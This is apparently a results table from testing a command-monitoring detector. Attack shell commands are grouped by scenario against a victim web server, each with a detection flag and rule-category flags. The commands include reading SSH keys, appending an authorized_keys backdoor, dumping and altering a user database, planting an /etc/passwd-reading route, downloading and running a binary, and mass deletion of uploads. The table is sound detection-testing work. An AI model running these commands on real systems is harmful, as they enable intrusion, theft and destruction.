scenario,step,num,command,detected,허용되지 않은 실행,grep 재귀 탐색 옵션 사용,허용되지 않은 zip 경로,허용되지 않은 cp 경로,잘못된 파일 도구 사용,허용되지 않은 link 경로,허용되지 않은 symlink 경로,허용되지 않은 파일 읽기,허용되지 않은 디렉토리 읽기,허용되지 않은 파일 쓰기,허용되지 않은 파일 옮김,금지된 chmod 경로,허용되지 않은 네트워크 연결,허용되지 않은 경로 삭제,대용량 DB 읽기,대량 파일 열기 (server),대량 파일 열기 (home),디렉토리 재귀 파일 탐색 (server),디렉토리 재귀 파일 탐색 (home),대량 파일 열기 (app),디렉토리 재귀 파일 탐색 (uploads),,,,,,,,,
b,2,5,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b,3,1,"while read -r line; do printf ""%s"" ""$line""; done < /tmp/dump.sql > ./static/uploads/attachments/019f16367a8e40fc8e8505856f57f746.txt",FALSE,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
c,1,1,find . -type d -iname '*upload*' -o -iname '*attach*' -o -iname '*media*' -o -name '*.jpeg' -o -name '*.jpg' -o -name '*.png',TRUE,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0
c,1,2,grep -Rl 'PNG\|Hello World Signature' .,TRUE,1,1,0,0,1,0,0,1,0,0,0,0,0,0,1,1,1,1,0,1,1,0,0,0,0,0,0,0,0,0
c,1,3,data/9/1_1.py,TRUE,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0
1,1,1,find . -name .env -o -iname *config*,TRUE,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0
1,1,2,"find ~/.ssh -name ""id_*""",TRUE,1,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
1,1,3,ls -laR,TRUE,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0
1,1,4,ls -laR ~/.ssh,TRUE,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
1,1,5,echo *,FALSE,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
1,1,6,echo ~/.ssh/*,TRUE,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
1,1,7,find . -name .e??,TRUE,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0
1,1,8,"for f in $(find .); do printf ""$f""; done;",TRUE,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0
1,1,9,"for f in $(find ~/.ssh); do printf ""$f""; done;",TRUE,1,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
1,1,10,busybox find . -name .env -o -iname *config*,TRUE,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0
1,1,11,"busybox find ~/.ssh -name ""id_*""",TRUE,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
1,1,12,grep -RIl 'SECRET\|PASSWORD\|_URL' .,TRUE,1,1,0,0,1,0,0,1,0,0,0,0,0,0,1,1,1,1,0,1,1,0,0,0,0,0,0,0,0,0
1,1,13,grep -RIl 'ssh-*' ~/.ssh,TRUE,1,1,0,0,1,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
1,1,14,data/1/1_1.py,TRUE,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0
1,2,14,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
2,1,1,find ~/ -name authorized_keys,TRUE,1,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,1,1,0,1,0,0,0,0,0,0,0,0,0
2,1,2,find ~/ -name authorized*,TRUE,1,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,1,1,0,1,0,0,0,0,0,0,0,0,0
2,1,3,ls -laR ~/,TRUE,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0
2,1,4,echo ~/*,TRUE,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
2,1,5,echo ~/*/*,TRUE,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
2,1,6,echo ~/*/*/*,TRUE,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0
2,1,7,echo ~/.ssh/auth*,TRUE,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
2,1,8,"for f in $(find ~/); do printf ""$f\n""; done;",TRUE,1,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,1,1,0,1,0,0,0,0,0,0,0,0,0
2,1,9,busybox find ~/ -name authorized*,TRUE,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,1,1,0,1,0,0,0,0,0,0,0,0,0
2,1,10,grep -RIl 'ssh-' ~/.ssh,TRUE,1,1,0,0,1,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
2,1,11,data/2/1_1.py,TRUE,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,1,1,0,1,0,0,0,0,0,0,0,0,0
2,1,12,data/2/1_2.py,TRUE,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,1,0,1,0,1,1,0,0,0,0,0,0,0,0,0
2,2,12,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
2,3,1,echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH6CAKUF9Hg6v9rHPko44XC1y2vDuomF8+nnZPJZWCde your_email@example.com' >> ~/.ssh/authorized_keys,TRUE,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
2,3,2,data/2/3_1.py,TRUE,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
3,1,1,find /home -name *.db -o -name *.sqlite* -o -name *.db3 -o -name *.mdb -o -name *.dat -o -name wal -o -name shm -o -name journal,TRUE,1,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,1,1,0,1,0,0,0,0,0,0,0,0,0
3,1,2,grep -RIla 'CREATE TABLE\|CREATE INDEX\|PRAGMA\|sqlite_master' .,TRUE,1,1,0,0,1,0,0,1,0,0,0,0,0,0,1,1,1,1,0,1,1,0,0,0,0,0,0,0,0,0
3,1,3,data/3/1_1.py,TRUE,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0
3,1,4,data/3/1_2.py,TRUE,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,1,0,1,0,1,1,0,0,0,0,0,0,0,0,0
3,2,1,sqlite3 board.db .dump > /tmp/dump.sql,TRUE,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
3,2,2,cat board.db > /tmp/dump,TRUE,1,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
3,2,3,head -n 1000000000 board.db > /tmp/dump,TRUE,1,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
3,2,4,cp board.db /tmp/dump,TRUE,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
3,2,5,sqlite3 board.db '.backup /tmp/a.db',TRUE,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
3,2,6,"sqlite3 board.db ""VACUUM INTO '/tmp/a.db'""",TRUE,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
3,2,7,tar czf /tmp/a.tar.gz board.db,TRUE,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
3,2,8,dd if=board.db of=/tmp/a.db bs=8K,TRUE,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
3,2,9,ln board.db /tmp/a.db,TRUE,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
3,2,10,ln -s ~/server/board.db /tmp/a.db,TRUE,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
3,2,11,data/3/2_1.py,TRUE,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
3,3,11,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
4,1,1,find /home -name *.db -o -name *.sqlite* -o -name *.db3 -o -name *.mdb -o -name *.dat -o -name wal -o -name shm -o -name journal,TRUE,1,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,1,1,0,1,0,0,0,0,0,0,0,0,0
4,1,2,grep -RIla 'CREATE TABLE\|CREATE INDEX\|PRAGMA\|sqlite_master' .,TRUE,1,1,0,0,1,0,0,1,0,0,0,0,0,0,1,1,1,1,0,1,1,0,0,0,0,0,0,0,0,0
4,1,3,data/4/1_1.py,TRUE,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0
4,1,4,data/4/1_2.py,TRUE,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,1,0,1,0,1,1,0,0,0,0,0,0,0,0,0
4,2,1,sqlite3 board.db .tables,TRUE,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
4,2,2,sqlite3 board.db 'select * from users',TRUE,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
4,2,3,"echo ""select * from users"" | sqlite3 board.db",TRUE,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
4,2,4,strings board.db | grep admin,TRUE,1,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
4,2,5,xxd board.db | head -n 10000000,TRUE,1,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
4,2,6,data/4/2_1.py,FALSE,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
4,3,1,sqlite3 ./board.db 'update users set is_admin=1 WHERE id=2',TRUE,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
4,3,2,data/4/3_1.py,FALSE,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
5,1,1,find . -type f \( -name '*.py' -o -name '*.html' -o -name '*.jinja*' \),TRUE,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0
5,1,2,"grep -r ""app.include_router\|@app.get\|@app.post\|@router\."" .",TRUE,1,1,0,0,1,0,0,1,0,0,0,0,0,0,1,1,1,1,0,1,1,0,0,0,0,0,0,0,0,0
5,1,3,data/5/1_1.py,TRUE,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0
5,2,1,sed -i 's/<title>.*<\/title>/<title>Hacked<\/title>/' app/templates/base.html,TRUE,1,0,0,0,1,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
5,2,2,"printf 'from fastapi import APIRouter
r=APIRouter()
@r.get(""a"")
def _(): return open(""/etc/passwd"").read()
' > app/routes/a.py && echo '
from app.routes.a import r as _a
app.include_router(_a)' >> app/main.py",TRUE,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
5,2,3,data/5/2_1.py,TRUE,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
6,1,3,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
6,2,1,tar czf /tmp/uploads.tar.gz ./static/uploads,TRUE,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0
6,2,2,zip -r /tmp/uploads.zip ./static/uploads/,TRUE,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0
6,2,3,zip -r _u.zip ./static/uploads/,TRUE,0,0,1,0,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0
6,2,4,cp -r ./static/uploads/. /tmp/uploads,TRUE,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0
6,2,5,find static/uploads/ -exec cp -r {} /tmp/ \;,TRUE,1,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0
6,2,6,ln -s /home/victim/server/static/uploads/ /tmp/uploads,TRUE,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
6,2,7,data/6/2_1.py,TRUE,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0
6,3,7,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
7,1,7,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
7,2,1,grep -RIla 'Hello World!' .,TRUE,1,1,0,0,1,0,0,1,0,0,0,0,0,0,1,1,1,1,0,1,1,0,0,0,0,0,0,0,0,0
7,2,2,data/7/2_1.py,TRUE,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,1,0,1,0,1,1,0,0,0,0,0,0,0,0,0
7,3,1,chmod +x ./static/uploads/attachments/0a602ea2e18d47bc960a59d642d6bb7e,TRUE,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
7,3,2,chmod 755 ./static/uploads/attachments/0a602ea2e18d47bc960a59d642d6bb7e,TRUE,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
7,3,3,data/7/3_1.py,TRUE,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
7,4,1,./static/uploads/attachments/0a602ea2e18d47bc960a59d642d6bb7e,TRUE,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
7,4,2,data/7/4_1.py,TRUE,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
8,1,1,curl http://127.0.0.1:12345/download > /tmp/file,TRUE,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
8,1,2,curl -fsSL http://127.0.0.1:12345/download -o /tmp/file,TRUE,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
8,1,3,wget http://127.0.0.1:12345/download -O /tmp/file,TRUE,1,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
8,1,4,echo '[base64 elf]' | base64 -d > /tmp/file,TRUE,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
8,1,5,echo '[base64 elf]' | base64 -d > ./file,TRUE,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
8,1,6,printf '[hexstring elf]' > /tmp/file2,FALSE,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
8,1,7,data/8/1_1.py,TRUE,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
8,1,8,data/8/1_2.py,FALSE,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
8,2,1,chmod +x /tmp/file,TRUE,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
8,2,2,chmod 755 /tmp/file,TRUE,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
8,2,3,chmod +x ./file,TRUE,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
8,2,4,chmod 755 ./file,TRUE,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
8,2,5,data/8/2_1.py,TRUE,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
8,3,1,/tmp/file,TRUE,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
8,3,2,data/8/3_1.py,TRUE,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
9,1,2,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
9,2,1,rm -rf ./static/uploads/*,TRUE,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0
9,2,2,rm -f ./static/uploads/5990d47c83f349d5ba19bf05f9c89941.png,TRUE,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
9,2,3,rm -rf ./static/uploads/,TRUE,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0
9,2,4,find ./static/uploads -type f -delete,TRUE,1,0,0,0,1,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0
9,2,5,truncate -s 0 ./static/uploads/5990d47c83f349d5ba19bf05f9c89941.png,TRUE,1,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
9,2,6,mv ./static/uploads/5990d47c83f349d5ba19bf05f9c89941.png /tmp/5990d47c83f349d5ba19bf05f9c89941.png,TRUE,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
9,2,7,data/9/2_1.py,TRUE,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
